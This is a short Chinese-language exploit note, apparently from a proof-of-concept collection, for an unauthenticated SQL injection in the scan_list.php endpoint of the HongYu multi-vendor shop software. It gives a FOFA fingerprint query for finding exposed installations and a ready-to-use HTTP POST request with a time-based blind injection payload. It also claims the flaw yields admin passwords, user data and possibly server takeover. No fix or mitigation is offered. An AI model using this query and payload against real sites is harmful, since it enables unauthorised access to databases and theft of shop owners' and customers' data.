# 鸿宇多用户商城scan_list.php存在SQL注入漏洞

鸿宇多用户商城 scan_list.php 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## Fofa

```javascript
body="HongYuJD" && body="68ecshopcom_360buy"
```

## poc

```javascript
POST /scan_list.php HTTP/1.1
Host: your-ip
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(4)))QkUH)&act=view
```

![image-20241025141431703](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251414765.png)